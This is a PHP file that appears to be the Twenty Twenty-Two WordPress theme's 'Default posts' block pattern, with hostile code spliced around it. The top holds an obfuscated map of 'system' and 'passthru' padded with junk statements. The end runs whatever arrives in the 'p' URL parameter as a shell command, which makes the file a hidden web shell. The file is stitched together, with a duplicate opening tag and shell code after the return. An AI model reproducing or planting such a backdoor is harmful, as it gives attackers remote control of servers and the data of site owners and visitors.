<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Default posts block pattern
 */
return array(
	'title'      => __( 'Default posts', 'twentytwentytwo' ),
	'categories' => array( 'query' ),
	'blockTypes' => array( 'core/query' ),
	'content'    => '<!-- wp:query {"query":{"perPage":10,"pages":0,"offset":0,"postType":"post","categoryIds":[],"tagIds":[],"order":"desc","orderBy":"date","author":"","search":"","exclude":[],"sticky":""},"align":"wide","layout":{"inherit":true}} -->
					<div class="wp-block-query alignwide"><!-- wp:post-template {"align":"wide"} -->
					<!-- wp:group {"layout":{"inherit":true}} -->
					<div class="wp-block-group"><!-- wp:post-title {"isLink":true,"align":"wide","fontSize":"var(--wp--custom--typography--font-size--huge, clamp(2.25rem, 4vw, 2.75rem))"} /-->

					<!-- wp:post-featured-image {"isLink":true,"align":"wide","style":{"spacing":{"margin":{"top":"calc(1.75 * var(--wp--style--block-gap))"}}}} /-->

					<!-- wp:columns {"align":"wide"} -->
					<div class="wp-block-columns alignwide"><!-- wp:column {"width":"650px"} -->
					<div class="wp-block-column" style="flex-basis:650px"><!-- wp:post-excerpt /-->

					<!-- wp:post-date {"isLink":true,"format":"F j, Y","style":{"typography":{"fontStyle":"italic","fontWeight":"400"}},"fontSize":"small"} /--></div>
					<!-- /wp:column -->

					<!-- wp:column {"width":""} -->
					<div class="wp-block-column"></div>
					<!-- /wp:column --></div>
					<!-- /wp:columns -->

					<!-- wp:spacer {"height":16} -->
					<div style="height:16px" aria-hidden="true" class="wp-block-spacer"></div>
					<!-- /wp:spacer -->

					<!-- wp:separator {"align":"wide","className":"is-style-wide"} -->
					<hr class="wp-block-separator alignwide is-style-wide"/>
					<!-- /wp:separator -->

					<!-- wp:spacer {"height":16} -->
					<div style="height:16px" aria-hidden="true" class="wp-block-spacer"></div>
					<!-- /wp:spacer --></div>
					<!-- /wp:group -->
					<!-- /wp:post-template -->

					<!-- wp:query-pagination {"paginationArrow":"arrow","align":"wide","layout":{"type":"flex","justifyContent":"space-between"}} -->
					<!-- wp:query-pagination-previous {"fontSize":"small"} /-->

					<!-- wp:query-pagination-numbers /-->

					<!-- wp:query-pagination-next {"fontSize":"small"} /-->
					<!-- /wp:query-pagination --></div>
					<!-- /wp:query -->',
);

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>